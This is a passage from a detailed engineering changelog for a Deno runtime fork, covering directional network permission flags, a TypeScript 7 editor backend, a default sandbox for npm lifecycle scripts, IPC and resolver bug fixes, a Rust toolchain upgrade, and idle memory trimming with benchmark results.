    `runtime/permissions/lib.rs`, `runtime/ops/permissions.rs`,
    `runtime/js/10_permissions.js`, `libs/cli_parser`, `cli/args`,
    `cli/tsc/dts/lib.deno.ns.d.ts`, the network ops in `ext/net`, `ext/fetch`,
    `ext/websocket`, `ext/kv`, `ext/node`, `ext/sql`). Carried from
    [denoland/deno#34036](https://github.com/denoland/deno/pull/34036) (head
    `41fbc2f`, its review's fixes included; closed upstream as superseded by
    unpublished work, so this is the latest public design). Four flags grant or
    deny one direction: `--allow-net-connect[=<hosts>]` /
    `--deny-net-connect[=<hosts>]` for outbound connections and
    `--allow-net-listen[=<hosts>]` / `--deny-net-listen[=<hosts>]` for
    listeners, with `--allow-net`'s host syntax (host, `host:port`, IPv4,
    `[IPv6]`, `*.example.com`, a bare `:port`, `unix:<absolute path>`).
    `--allow-net` / `--deny-net` keep meaning both directions; the two models
    are exclusive per invocation (an error, also for a deno.json
    `permissions.net` combined with a directional flag, and for `--allow-all`
    with an `--allow-net-*` flag), so no merge rules between them exist. Without
    any of the new flags nothing changes, prompts and errors included. In the
    directional model a prompt and a denial name the direction
    (`Deno requests net connect access to ...`,
    `Requires net listen access to ...`,
    `run again with the
    --allow-net-listen flag`),
    `Deno.permissions.query/request/revoke` take
    `{ name: "net-connect" | "net-listen", host }` (typed, also in
    `PermissionName`; `name: "net"` keeps reading the legacy permission, which
    is `prompt` there), and the permission audit (`DENO_AUDIT_PERMISSIONS`)
    records `net-connect` / `net-listen`. A worker's single `net` option
    inherits the parent's split, or is clamped against both directions (a list
    or `true` needs the parent to have both).

    Classified as connect: `Deno.connect` (TCP, Unix, vsock), `connectTls`,
    `connectQuic`, `DatagramConn.send`, `resolveDns`'s name server, `fetch` (and
    its proxies, `createHttpClient`), `WebSocket`, remote KV, `Deno.SQL` (TCP
    and Unix), `node:net` / `node:http` / `node:tls` connections,
    `node:dns.lookup`, `dgram`'s `send`. As listen: `Deno.listen` (TCP, Unix,
    vsock), `listenTls`, `listenDatagram` (and joining a multicast group),
    `QuicEndpoint`, `Deno.serve` (and `deno serve`'s address), `node:net` /
    `node:http` servers and pipes, `dgram`'s `bind`, `node:inspector.open`. Not
    permission-gated, as before: the `--inspect` debugger server and the LSP
    (CLI flags, not program operations). Item 80's resolve-time deny check runs
    per direction (`check_net_connect_resolved` / `check_net_listen_resolved`).
    As before, Node's `dns.lookup` reports a refused check as `EPERM` and
    `dgram`'s `send` as `UNKNOWN` (errnos, as Node would), so those two don't
    name the direction.

    Our changes on top of the pull request:
    - **The model is fixed when the permissions are built** (a worker takes its
      parent's). The pull request decided it at every check from which fields
      were populated, so a granted prompt for the legacy `name: "net"` filled
      the legacy field and switched every check back to it, dropping
      `--deny-net-connect` / `--deny-net-listen`. In the directional model
      `request({ name: "net" })` no longer prompts (the legacy field grants
      nothing there) and answers with its state.
    - The flags are ported to the fork's `deno_cli_parser` (the pull request
      targets the clap parser the fork removed): parsing, the bare-port
      expansion, URL rejection, the `--allow-all` conflict, local `deno install`
      refusing them, the help text, and `to_permission_args` (what
      `deno install -g` and `deno x` pass on).
    - The fork's own call sites, which the pull request predates: Unix socket
      paths (`check_net_unix_socket` split into `_connect` / `_listen`, and
      `deno_net::check_unix_socket_path` takes a `NetDirection`), multicast
      membership, `Deno.SQL`, the `fetch` proxy connector, the import and KV
      resolve-time checks, and `normalize_ip` (IPv4-mapped IPv6) in the
      directional resolved checks.
    - A packaged desktop app keeps the directional model: its loopback baseline
      goes to `allow_net_connect` and `allow_net_listen` instead of `allow_net`
      (which would have switched it back to the legacy model). The npm
      lifecycle-script jail (item 83) clamps the directional grants of a `deno`
      started inside it as it clamps `--allow-net`. A doc test's shebang with a
      directional flag is refused (`Deno.PermissionOptionsObject` has one `net`
      key), like a scoped `--deny-*`.

    Tests: `permission/net_directional` (the pull request's: each direction
    allowed and denied, the legacy/directional conflicts on the command line and
    from deno.json, the queries, a denied query reporting `denied`, the default
    wording unchanged), `permission/net_directional_ops` (every operation above
    under connect-only, listen-only, both, a connect deny, a listen deny, legacy
    `--allow-net`, legacy `--deny-net` and no grant; Unix sockets connect-only,
    listen-only, scoped `unix:` rules per direction (Linux), legacy and none;
    the resolve-time deny per direction for `fetch`, `WebSocket`, `Deno.listen`
    and `node:net`; a worker inheriting the split and refused a wider `net`),
    `permission/net_directional_audit` (the audit names the direction),
    `permissions_prompt_net_directional` (`tests/integration/run_tests.rs`, the
    prompts' wording), the pull request's unit tests in
    `runtime/permissions/lib.rs` plus
    `test_legacy_net_request_cannot_switch_out_of_directional` (fails before:
    the bypass above), the parser tests in `libs/cli_parser/src/tests_full.rs`
    and `tests.rs`, `defaults_keep_the_directional_net_model` (`cli/rt/run.rs`)
    and the jail's `clamp` test.

94. **`feat(lsp)`: TypeScript 7 is the editor default, and its gaps closed**
    (`feat/tsgo-lsp-polish`, CLI only; `cli/lsp/tsgo.rs`,
    `cli/lsp/language_server.rs`, `cli/tsc/tsconfig_gen.rs`,
    `cli/tools/installer/augmentations.rs`, `cli/tools/installer/local.rs`,
    `cli/tools/check.rs`, `.github/denext-runtime/manifest.py`). Item 46's tsgo
    backend becomes what a denext release's `deno lsp` uses, and what that
    surfaced is fixed:
    - **The default.** A denext release build (`DENEXT_VERSION` baked in, item
      26) selects tsgo unless the editor's `deno.unstable` setting lists
      features but not `tsgo-lsp`; an empty list (what editors send by default)
      or no setting is the default. `DENO_UNSTABLE_TSGO_LSP` still wins either
      way (`=0` keeps TypeScript 6), and any other build (tests, a local
      `cargo build`) keeps upstream's TypeScript 6 unless asked, so upstream's
      LSP tests run unchanged. The binary is resolved before the session
      initializes (the override, `typescript-lsp/` beside `deno`, the `DENO_DIR`
      copy, else a download within 120 s); when it can't be had the session uses
      TypeScript 6 with a warning naming why, instead of a backend that never
      starts. The log says which backend was picked and why
      (`Using the TypeScript 7 (tsgo) language service (the default of this
      runtime; ...)`).
    - **No user files rewritten.** `deno sync-types` as the backend runs it
      (`DENO_INTERNAL_SYNC_TYPES_FOR_EDITOR=1`, internal) no longer creates the
      root `tsconfig.json` or rewrites a user's (it turned `extends` into an
      array, a diff in the user's repository on every editor session). tsgo
      reads an open document instead of the file, a missing one included, so the
      backend gives it the root config as one (`didOpen`, then `didChange` when
      it changes): the user's `tsconfig.json` with `./.deno/tsconfig.json` first
      in its `extends`, the generated `paths` and `types` merged and the npm
      project `references` added (what `deno check` builds for its own temp
      config, `build_check_root_overlay`), when Deno honors it (a `deno.json` /
      `package.json` beside it); else a config that extends the generated one. A
      change to the user's file re-runs `sync-types` and updates the document.
      Only `.deno/` (ignored by its own `.gitignore`) is written. The standalone
      `deno sync-types` keeps writing the root config, its purpose (stock
      tooling reads it).
    - **Module augmentations (TS2664).** TypeScript 7 resolves the name in
      `declare module "denext" { ... }` through the generated `paths` but,
      unlike TypeScript 6, does not load the module it finds, so an augmentation
      of a module the checked graph never imports failed with TS2664 ("Invalid
      module name in augmentation") even with the import-map key mapped.
      `deno sync-types` now finds the top-level `declare module
      "<name>"`
      blocks of the project's own TypeScript files (a declaration file only when
      it is a module; not relative names, wildcard patterns or `node:`
      builtins), maps each name as it maps imports, and writes
      `.deno/module_augmentations.d.ts` with an `import type {} from "<name>"`
      for each name the generated config resolves (a `paths` entry, or a package
      in `node_modules`), listed in its `files`. A name that resolves nowhere
      still reports TS2664, as under TypeScript 6. The augmented names are part
      of the generated project's inputs, so an edit that adds one regenerates
      it. The LSP's tsgo backend reads the same file.
    - **Release manifest.** `manifest.json` lists
      `typescript_lsp: { version, sha256, tree_sha256 }` per CLI target beside
      `typescript_check`, recomputed from the zip's `typescript-lsp/` the same
      way, and refuses an archive whose files disagree with its
      `BUILD_INFO.json`; `cli_smoke.sh` checks that `deno lsp` defaults to the
      shipped build and that `DENO_UNSTABLE_TSGO_LSP=0` keeps TypeScript 6.

    Tests: `tests/specs/check/module_augmentation_unimported` (an augmentation
    of an import-map module nothing imports passes under both engines; one of an
    unresolvable name fails with TS2664 under both; an augmentation added by a
    local edit regenerates the reused project), unit tests
    `augmentations_are_top_level_declare_module_blocks`,
    `ambient_declarations_and_patterns_are_not_augmentations`,
    `imports_only_the_names_the_config_resolves`
    (`cli/tools/installer/augmentations.rs`),
    `editor_root_config_never_writes_the_root_tsconfig`
    (`cli/tsc/tsconfig_gen.rs`), `backend_selection` (`cli/lsp/tsgo.rs`);
    `lsp_tsgo_leaves_the_users_tsconfig_alone`,
    `lsp_tsgo_unavailable_falls_back_to_typescript_6` and
    `lsp_tsgo_import_map_specifiers` (no root `tsconfig.json` written) in
    `tests/integration/lsp_tsgo_tests.rs`;
    `.github/denext-runtime/manifest_test.py` (run by the lint job of
    `denext_tests.yml`).

95. **`fix(watch)`: a `--watch` child keeps its parent's IPC channel across
    restarts** (`fix/rc3-batch`, for runtime `3.0.0-rc.3`; `cli/args/mod.rs`,
    `cli/tools/run/mod.rs`, `ext/io/bi_pipe.rs`, `ext/process/ipc.rs`,
    `ext/node/ops/ipc.rs`). A parent's
    `spawn(deno, ["run", "--watch", ...], { stdio: [..., "ipc"] })` (and so
    `node --watch` under Deno, as node_compat's
    `parallel/test-watch-mode-kill-signal-default.mjs` runs it) gave only the
    first run a channel: `NODE_CHANNEL_FD` is removed once read and the run's
    worker closes the fd when the run ends, so a restarted run had no
    `process.send` and failed. `node --watch` keeps the channel for every run.
    - `retain_node_ipc_for_watch()`, called by `run_with_watch` before the first
      run, keeps the inherited fd open (close-on-exec, so the program's own
      children don't inherit it), and `CliOptions::node_ipc_init` hands each run
      an `F_DUPFD_CLOEXEC` duplicate, which that run's worker owns and closes.
    - Closing a duplicate leaves the socket open, but tokio's `OwnedWriteHalf`
      also shuts the socket's write side down when dropped, and a shutdown
      applies to every fd of the socket: the restarted run's first
      `process.send` then failed with `EPIPE`. `BiPipeWrite` takes
      `keep_open_on_drop()` (tokio's `forget()` instead of the drop's shutdown;
      the fd is still closed), and the IPC resources a run opens from
      `NODE_CHANNEL_FD` use it once the watcher has marked the channel shared
      (`deno_process::ipc::set_child_ipc_channel_shared()`). Every other IPC
      channel still shuts down on drop, so a parent still sees `disconnect` at
      once when a child's fd is shared with a grandchild.

    Unix only; on Windows a restarted run still has no channel. Test:
    `tests/specs/node/child_process_ipc_watch_restart` (JSON and advanced
    serialization: the restarted run's message arrives; before, the parent
    waited for it until its 30 s bound, and it prints the watcher's output when
    that bound fires).

96. **`fix(resolver)`: a linked package on another Windows drive keeps its
    import map** (`fix/rc3-batch`, for runtime `3.0.0-rc.3`, CLI only;
    `libs/resolver/workspace.rs`). The workspace's synthetic import map scopes
    each workspace member and `links` package by its directory, relative to the
    root config's (`import_map::ext::create_synthetic_import_map`), and
    `Url::make_relative` knows nothing of drive letters: from `file:///C:/app/`
    a package at `file:///D:/lib/` became the scope `./../../D:/lib/`, which
    resolves to `file:///C:/D:/lib/`. Its modules then lost the package's own
    import map
    (`Import "x" not a dependency and not in
    import map from "file:///D:/lib/mod.ts"`),
    which is how an app on `C:` importing a denext checkout on `D:`
    (`migrate --denext-local-path`) failed; on one drive it worked. A child on
    another drive than the base map is now scoped by absolute URLs (its
    directory, and each import resolved against it); the rest still go through
    the crate. Reproduced on Windows with a `subst` drive and
    `"links": ["file:///Q:/"]` (stock 2.9.7 and rc.2 alike).

    Drives are compared as spelled (`make_relative` takes `c:` and `C:` for
    different drives as well).

    Superseded by item 106, which replaces this wrapper with the general fix
    (every value and scope key, not only a child on another drive).

97. **`fix(ext/node, npm)`: a handle that fails to open reports its errno, and a
    bin named `..` is skipped** (`fix/rc3-batch`, for runtime `3.0.0-rc.3`;
    `ext/node/polyfills/internal/child_process.ts`,
    `libs/npm_installer/bin_entries.rs`).
    - **`createIpcHandle`.** A handle received over IPC (a `net.Socket`,
      `net.Server`, native `TCP` / `Pipe` or `dgram.Socket`) is wrapped with
      `open(fd)`, which returns a negative libuv error number. It was looked up
      in `codeMap` (code name -> number) as if it were a name, so
      `errnoException(undefined, "open")` threw
      `TypeError
      [ERR_INVALID_ARG_TYPE]` instead of the open error. The
      number goes to `errnoException` as it is (`open EBADF`, `errno`, `code`,
      `syscall`), and the wrap that failed to open is closed.
    - **Bin names.** `normalize_bin_name` kept the last path segment of a `bin`
      map key, so `..` (or `x/..`) linked `node_modules/.bin/..`, which is
      `node_modules` itself: the symlink failed with `AlreadyExists` and the
      retry's `remove_file` on the directory failed the install. A key that
      names no file (empty, `.`, `..`, after trailing separators) is skipped, as
      npm's `npm-normalize-package-bin` drops it.

    Tests:
    `[child_process ipc] a received handle that fails to open throws
    its errno error`
    (`tests/unit_node/child_process_test.ts`, through
    `require("internal/child_process").createIpcHandle`, now exported);
    `bin_names_that_name_no_file_are_skipped`,
    `collect_bin_files_skips_bin_names_that_name_no_file`,
    `set_up_bin_entry_skips_a_dot_dot_bin_name`
    (`libs/npm_installer/bin_entries.rs`).

98. **`fix(check)`: `deno check -- <files>`, and the `deno add` hint on the
    native check** (`fix/rc3-batch`, for runtime `3.0.0-rc.3`, CLI only;
    `libs/cli_parser/src/convert.rs`, `cli/tools/check.rs`).
    - **Files after `--`.** `check` has no script arguments, but the parser put
      what follows `--` into `argv`, so `deno check -- a.ts` dropped the file
      and checked the whole project (stock 2.9.7 too; denext's dev type-check
      overlay passed its files that way). They are files now, one starting with
      a hyphen included (`deno check -- -x.ts`).
    - **The `deno add` hint.** The native check (item 47) printed the compiler's
      `TS2307 Cannot find module 'x' or its corresponding type
      declarations.`
      (or TS2882 for a side-effect import) for an import Deno itself could not
      resolve, where the in-process checker said `Import "x" not a dependency`
      with a hint to run `deno add npm:x`. A TS2307 / TS2792 / TS2882 at an
      import the graph recorded a resolution error for (one that is not "module
      not found": a bare specifier not in the import map, a missing `./` prefix,
      an unresolvable package) takes Deno's message for it, as TS2307, keeping
      the compiler's position and source line (so `node:unknown` reads
      `No such built-in module: node:unknown` again). A module Deno resolved but
      could not find keeps the compiler's message.

    Tests: `check_files_after_double_dash`
    (`libs/cli_parser/src/tests_full.rs`); spec `check/double_dash_files` (a
    file after `--`, one starting with a hyphen, files on both sides of `--`);
    the hint in `check/bare_specifier_not_found`, `check/with_bare_import` and
    `check/ts_suppression_unresolved_import` (their expectations from before the
    native check, with the compiler's source line).

99. **`feat(cli,runtime)`: an identity marker for denext's runtime**
    (`feat/identity-marker`, for runtime `3.0.0-rc.3`; `cli/lib/version.rs`,
    `cli/args/flags.rs`, `cli/lib/worker.rs`, `runtime/worker_bootstrap.rs`,
    `runtime/js/99_main.js`, `cli/tsc/dts/lib.deno.ns.d.ts`). Upstream Deno is
    releasing a 3.0.0 too, so a version string such as `3.0.0-rc.3` no longer
    says whose runtime it is. Every build of this fork now carries a marker
    upstream Deno has no equivalent of:
    - **`deno --version`** prints a last line `denext <version> (Brainwires)`
      after upstream's three, which keep their format (`deno -V` stays one
      line).
    - **`Deno.build.denext`**: the same version as a string, in the main runtime
      and in workers (absent on upstream Deno; typed in `lib.deno.ns.d.ts` as a
      denext extension). It is passed in the bootstrap options
      (`BootstrapOptions::denext_version`) and set before `Deno.build` is
      frozen.
    - The version is the release's (`DENEXT_VERSION`, item 26) on a release or
      CI build and the fork's own `cli/Cargo.toml` version on any other build
      (tests, a local `cargo build`), so it equals `Deno.version.deno`.
    - **The release manifest** records it under `cli.identity` (`buildDenext`,
      `versionLine`), and `cli_smoke.sh` checks both on every CLI archive.

    denext detects its runtime by this marker (`Deno.build.denext` in process,
    the `--version` line for a child binary) and keeps its version-pattern check
    only for the runtimes from before it (`3.0.0-rc.2` and earlier).

    Tests: `denext_runtime_marks_every_build_of_the_fork`
    (`cli/lib/version.rs`); `buildInfoDenextMarker` /
    `buildInfoDenextMarkerInWorker` (`tests/unit/build_test.ts`); spec
    `flags/version_flag` (`long_version_names_denext`,
    `short_version_is_one_line`, `build_denext_matches_version_line`);
    `test_cli_records_the_identity_marker`
    (`.github/denext-runtime/manifest_test.py`).

100. **`chore`: Rust 1.99.1** (`chore/rust-1.99.1`, CLI and runtime;
     `rust-toolchain.toml`, `Cargo.lock`). The toolchain moves from upstream's
     1.95.0 to 1.99.1 (stable, 2026-10-15). Every CI job, the runtime release
     workflow and the nix shell read the version from `rust-toolchain.toml`, so
     the file is the only pin. The new compiler and clippy needed:
     - **Lints new in 1.96-1.99** (clippy runs with `-D warnings`):
       `useless_borrows_in_formatting` (a redundant `&` in `format!` arguments,
       across the workspace), `chunks_exact_to_as_chunks` (the
       `crypto.randomUUID()` batch op and `ext/node`'s UTF-16 writer iterate
       fixed-size arrays), `for_kv_map`, `question_mark`, `needless_late_init`
       and collapsible `if let` (machine-applicable suggestions, applied as
       written).
     - **`result_large_err`** (a 128-byte limit the error types now reached):
       `ClientSendError` boxes its `Uri`, `NpmModuleLoadError`'s `DirImport` /
       `UnableToLoad` box their referrer `Url` (a Windows `PathBuf` is larger),
       and the CLI registry's `ApiError` boxes its flattened `data`.
     - **Deprecated `std::f64` module constants**: the CSS numeric parser uses
       `f64::INFINITY` / `NEG_INFINITY` / `NAN` and `std::f64::consts`.
     - **Lints fired inside derive / attribute macros**, fixed upstream:
       `async-trait` 0.1.88 -> 0.1.92 (`double_must_use` in `#[async_trait]`
       expansions) and `thiserror` 2.0.12 -> 2.0.21 (`redundant_field_names` in
       `#[from]` conversions). Lockfile-only.
     - One reasoned `allow`: the npm resolution bench's download progress line
       keeps `eprintln!` (`clippy::print_stderr`).

     No behaviour change; covered by the existing suites (`denext tests` full
     matrix, `denext runtime` release builds).

101. **laufey `a0f2c26`: downloads from the app's own scheme** (runtime
     `3.0.0-rc.4`; laufey `development-denext` `a0f2c26`, API 49 unchanged;
     `LAUFEY_SHA` in `.github/workflows/denext_runtime.yml`,
     `cli/rt_desktop/Cargo.toml`, `Cargo.lock`). An attachment response
     (`Content-Disposition: attachment`) or an `<a download>` link served by the
     app's custom scheme (`myapp://app`) silently never started a download on
     any backend: WebKit hands a download to its network process, which never
     had the scheme handler's load, and Chromium's link download (CEF, WebView2)
     has no URL loader for an embedder scheme. Every host now saves such a
     download itself: the download policy and the save dialog as for any
     download, then a GET of the URL through the app's scheme handler, written
     to a temporary file that replaces the chosen path once the whole 2xx
     response arrived (a non-GET attachment is refused and logged, never sent
     again; Windows paths outside the ANSI code page work). WKWebView also
     honours an attachment for a type it could display. The same laufey commit
     pins Rust 1.99.1 (as item 100 does here) and takes rustls-webpki 0.103.16
     in `webauthn-linux` (RUSTSEC-2026-0382). No change on the runtime side;
     covered by laufey's downloads unit test and native e2e battery (a
     custom-scheme step) and this fork's `denext runtime` e2e.

102. **`feat(ext/http)`: `request.signal` aborts only on a disconnect or a
     timeout, by default** (`feat/deno3-default-flips`, for runtime
     `3.0.0-rc.5`; `runtime/features/data.rs`, `cli/args/flags.rs`,
     `cli/args/mod.rs`, `cli/lib/args.rs`, `cli/rt/run.rs`,
     `runtime/worker_bootstrap.rs`, `ext/http/00_serve.ts`). Adapted from
     [denoland/deno#35733](https://github.com/denoland/deno/pull/35733) (open,
     for Deno 3.0), the user's decision of 2026-10-22. `Deno.serve` aborted
     `request.signal` when the handler's response had been sent, so code that
     ties work to the signal (Vite's `http-proxy`, `http-proxy-middleware`, a
     `fetch` forwarded with `signal: req.signal`) saw an `AbortError` on every
     successful request (denoland/deno#28850). The fixed behavior was opt-in as
     `--unstable-no-legacy-abort`; it is now the default for `deno run`,
     `serve`, `test`, workers and compiled programs (item 36): the signal fires
     only when the client disconnects or the request times out. To learn that a
     response was delivered, use the handler's `info.completed` promise.
     - `--unstable-no-legacy-abort` and `"unstable": ["no-legacy-abort"]` are
       accepted and do nothing (hidden from `--help`), as upstream's PR does.
     - **The opt-out** (upstream's PR has none; kept for code that relied on the
       abort as a completion signal): `--unstable-legacy-abort`,
       `"unstable": ["legacy-abort"]` in deno.json, or `DENO_LEGACY_ABORT=1` in
       the environment. A program compiled with the flag or the config entry
       keeps it, and a compiled program run with `DENO_LEGACY_ABORT=1` gets it
       too.
     - The legacy-behavior warning on the first request (denoland/deno#34397) is
       gone: legacy mode is now something you ask for. An embedder of
       `deno_runtime` gets the new default from `BootstrapOptions::default()`
       and can still set `no_legacy_abort: false`.

     Tests: `httpServerSignalCancelled`,
     `httpServerSignalNotAbortedOnSuccessfulRequest` and
     `httpServerLegacyAbortOptOut` (`tests/unit/serve_test.ts`: the default, the
     no-op flag, the opt-out flag and `DENO_LEGACY_ABORT=1` / `=0`, no notice);
     `no_legacy_abort_by_default` (`cli/args/flags.rs`); spec
     `serve/request_signal_streaming` (`default`, and `legacy_abort` aborting
     only after the streamed body); spec `compile/no_legacy_abort` (the default,
     the no-op flag and config entry, the opt-out as a flag, a config entry and
     `DENO_LEGACY_ABORT=1` at run time).

103. **`feat(npm)`: lifecycle scripts are jailed by default** (`jail-scripts`
     on; `feat/deno3-default-flips`, for runtime `3.0.0-rc.5`;
     `libs/npmrc/supply_chain.rs`, `cli/factory.rs`, `cli/supply_chain/jail.rs`,
     `libs/cli_parser`). The user's decision of 2026-10-22, the "default-on only
     in a future major" step of item 83 (denoland/deno#35714). An approved
     dependency's lifecycle script (`--allow-scripts`, `allowScripts`) now runs
     in item 83's jail unless something turns it off: a scrubbed environment, a
     scratch HOME, writes only beneath node_modules and the package's `write`
     paths, no credential files, no network unless allowed, every `deno` it
     starts clamped. The project's own scripts (item 54) are still not jailed.
     - **The opt-out**: `--no-jail-scripts` (on every command that takes
       `--allow-scripts`; it conflicts with `--jail-scripts`),
       `jail-scripts=false` in `.npmrc` or `npm_config_jail_scripts=false`, or
       deno.json `"supplyChain": { "jailScripts": false }`. Where sources
       disagree, item 86's rule still holds (the stricter value, on, wins), so a
       `.npmrc` can't quietly turn off what deno.json asks for; the command line
       flag, the user's own request, overrides the files. Under `paranoid` every
       opt-out is an error, `--no-jail-scripts` included.
     - `--jail-scripts` stays (it is the default now); per-package exceptions
       (`jailScripts.packages`) and `jailScripts.net` are unchanged.
     - Where the OS can't confine the script's other programs (Windows; Linux
       without Landlock; macOS without a working `sandbox-exec`), a default jail
       applies the environment, HOME and Deno clamp quietly; the warning is kept
       for a jail that was asked for (`--jail-scripts`, `jail-scripts=true`, an
       object `jailScripts`, `paranoid`), so every Windows install doesn't print
       it. (Since item 108 an object that holds only `packages` doesn't count.
       Item 124 reverses this: the warning is printed once per install on a
       default jail too.)
     - `npm_config_user_agent` now passes into the jail (it names the package
       manager; the `user` in its name had dropped it with the credential keys).

     What changes for an app: a dependency's script that writes outside
     node_modules (to `$INIT_CWD`, the project, the system temp directory),
     reads a token from the environment, downloads at install time (node-gyp's
     headers, a prebuilt binary from an undeclared host) or runs `npx` now fails
     unless the package gets an exception or the jail is turned off. Spec tests
     that exercise exactly that unjailed behavior pass `--no-jail-scripts`
     (`npm/lifecycle_scripts/argument`,
     `npm/lifecycle_scripts/hoisted_dep_bins`,
     `npm/lifecycle_scripts_node_compat`,
     `install/workspace_member_dep_lifecycle_init_cwd`, `compile/node_api`,
     `compile/bundle/native_addon`, `compile/self_extracting/npm_and_jsr`, and
     `install/install_entrypoint`, `npm/lifecycle_scripts/config/allow_all`
     through its deno.json, and the `approve_scripts_*` tests
     (`tests/integration/pm_tests.rs`) through `npm_config_jail_scripts=false`:
     they build a native addon with node-gyp, write to `$INIT_CWD` or the
     project, or run `npx`).

     Tests: `npm/supply_chain_jail` (`jailed_by_default`; the opt-out restoring
     the old behavior as `--no-jail-scripts` (`not_jailed`, `not_jailed_linux`),
     as the `.npmrc` key's environment form (`not_jailed_by_npmrc_key`) and in
     deno.json (`not_jailed_by_deno_json`); `paranoid_refuses_no_jail_scripts`),
     `defaults`, `paranoid_turns_every_member_on` and `jail_scripts_opt_out`
     (`libs/npmrc/supply_chain.rs`), `jail_scripts_and_allow_low_downloads`
     (`libs/cli_parser`), `env_allow_list` (`cli/supply_chain/jail.rs`).

104. **`feat(runtime)`: `--unstable-idle-trim`, memory back to the OS when the
     event loop goes idle** (`feat/idle-trim`, CLI and runtime;
     `runtime/idle_trim.rs`, `runtime/worker.rs`, `runtime/features/data.rs`,
     `cli/args/mod.rs`, `cli/lib/worker.rs`, `cli/factory.rs`, `cli/rt/run.rs`,
     `libs/cli_parser`). A long-running server's resident memory after a load
     burst is mostly memory glibc's allocator keeps in its arenas after the
     JavaScript heap let go of it: on `examples/hello` under `denext start`, a
     full GC followed by `malloc_trim(0)` frees 120-220 MB that otherwise stays
     resident. Opt-in, behind an unstable feature:
     - **On:** `--unstable-idle-trim` (`run`, `serve`, `compile`; a compiled
       binary keeps it, as it keeps `--unstable-legacy-abort`, item 102),
       `"unstable": ["idle-trim"]` in the config file, or
       `DENO_UNSTABLE_IDLE_TRIM=1` (read by `deno` and by a compiled binary at
       start).
     - **What:** once the main worker's event loop has gone
       `DENO_IDLE_TRIM_DELAY_MS` (default 1000) without being woken (no timer
       fired, no I/O, no op completed, no cross-thread task) after activity, it
       runs `low_memory_notification()` (a full GC) and then `malloc_trim(0)`.
       At most once per idle period (it re-arms only on the next wake-up) and
       never twice within `DENO_IDLE_TRIM_MIN_INTERVAL_MS` (default 10000).
       After the first trim, a due trim is skipped unless the RSS has grown by
       `DENO_IDLE_TRIM_MIN_GROWTH_MB` (default 16) since the last trim left it:
       a server woken by its own periodic timers otherwise ran a 4-30 ms full GC
       every 10 s for nothing (measured below, before the gate). It runs between
       event loop polls, so never while JavaScript (a request handler included)
       runs; work that arrives during a trim waits for it. A process whose loop
       is woken more often than the delay (an interval timer, steady traffic) is
       never trimmed.
     - **Where:** glibc Linux only. On macOS, Windows and musl the flag is
       accepted and does nothing (no wrapper around the event loop either).
     - **How:** `MainWorker::run_event_loop` polls the loop with a waker that
       records every wake-up of the task; while the loop stays pending, a tokio
       sleep fires at the deadline (`IdleTrimScheduler`, clock-free). The sleep
       is re-armed lazily: activity only moves the deadline later, so an armed
       sleep fires early and is re-armed then (one timer update per delay under
       load, not one per poll). Only the main worker is wrapped; the trim itself
       is process-wide.
     - **Diagnostics:** `DENO_IDLE_TRIM_TRACE=1` prints one line per trim to
       stderr: the GC and `malloc_trim` durations and the RSS before and after.
     - glibc's own `MALLOC_ARENA_MAX` needs no flag (glibc reads it from the
       environment); it was measured alongside, below.

     Measured on biscuits (8 vCPU EPYC-Milan KVM, 15 GB), a throwaway
     `denoland/deno:2.9.7` container per run with this branch's release CLI
     (`denext runtime` `cli_only` build) mounted. Server on CPUs 0-3, a
     closed-loop fetch load (concurrency 32) on CPUs 4-5, 1-min load < 1.8 at
     each start. Per run: one 10,000-request warm-up, five 10,000-request
     bursts, RSS sampled after 3 s and 30 s idle, a second burst, 30 s idle
     again. `hello` is denext's `examples/hello` (`denext start`, in-process,
     `DENEXT_DENO=stock`); `plain` is a `Deno.serve` handler that builds a
     400-row JSON + HTML page per request. Three alternating rounds (final
     build, with the growth gate and lazy sleep):

     | server | mode | req/s (median per round) | p99 ms (median) | RSS after load (MB) | after 3 s idle  | after 30 s idle | after burst 2 + 30 s | trims |
     | ------ | ---- | ------------------------ | --------------- | ------------------- | --------------- | --------------- | -------------------- | ----- |
     | hello  | off  | 2006 / 2096 / 2208       | 23.3            | 652 / 605 / 541     | 652 / 605 / 541 | 447 / 451 / 400 | 447 / 451 / 400      | 0     |
     | hello  | on   | 2122 / 2258 / 2072       | 23.1            | 542 / 592 / 538     | 173 / 173 / 174 | 172 / 172 / 173 | 172 / 170 / 173      | 2     |
     | plain  | off  | 6379 / 6994 / 7027       | 11.5            | 142 / 139 / 148     | 142 / 139 / 148 | 142 / 139 / 148 | 142 / 139 / 142      | 0     |
     | plain  | on   | 7206 / 6797 / 6650       | 11.3            | 149 / 150 / 149     | 65 / 65 / 65    | 65 / 65 / 65    | 65 / 65 / 65         | 2     |

     - **Memory:** with the flag, `hello` settles at ~172 MB within 3 s of going
       idle, against 541-652 MB (and still 400-451 MB 30 s later, once V8's own
       memory reducer has run) without it; `plain` 65 MB against 139-148 MB.
     - **Throughput / latency:** no difference beyond round-to-round noise
       (req/s and p99 overlap in both directions); no trim ever ran during a
       burst (bursts keep the loop woken).
     - **Cost of a trim** (at idle only, from `DENO_IDLE_TRIM_TRACE`): `hello`
       after a burst, GC 112-217 ms + `malloc_trim` 9-26 ms; `plain` GC 8-18 ms
       - 1-2 ms. A request that arrives during one waits that long once.
     - **Before the growth gate** (first build, one round of each mode): the
       same memory results, but 5 trims per run instead of 2; the extra three
       ran on an already-trimmed process every 10 s (GC 4-30 ms, RSS change
       under 1 MB), woken by periodic timers. The gate removed them.
     - **`MALLOC_ARENA_MAX=2`** (first build, two rounds): no consistent effect
       on peak RSS (504-577 MB vs 534-538 MB for `hello`), 5% lower idle RSS
       without the trim (369-378 vs 399 MB), none with it (168-169 vs 170-171
       MB), req/s within noise. Not worth a knob: the trim subsumes it.

     Tests: the scheduler and the poll wrapper in `runtime/idle_trim.rs`
     (`trims_once_the_loop_is_idle_for_the_delay`,
     `trims_at_most_once_per_idle_period`,
     `skips_a_trim_unless_memory_grew_since_the_last`,
     `keeps_the_minimum_spacing_between_trims`, `config_reads_the_environment`,
     `trims_an_idle_loop_once_and_not_a_busy_one`); spec `run/idle_trim` (on
     Linux, ~300 MB allocated and dropped, then idle: one trim and the RSS falls
     by more than half the growth, with the flag, the environment variable, the
     config file and in a compiled binary; off by default; a busy loop never
     trimmed; the flag accepted on every target); the parser test
     `unstable_idle_trim_flag` (`libs/cli_parser/src/tests_full.rs`).

     **Follow-up (`fix/idle-trim-guard`, runtime only; `runtime/idle_trim.rs`):
     a check the growth gate skips no longer counts toward `min_interval`.**
     `take_due` recorded the last trim when it claimed the idle period's check,
     whether or not the trim then ran, so a wake-up that brought no load shortly
     after a trim (a keep-alive connection closing) left a skipped check at the
     10 s mark, and the trim after the next burst of load waited 10 s from that
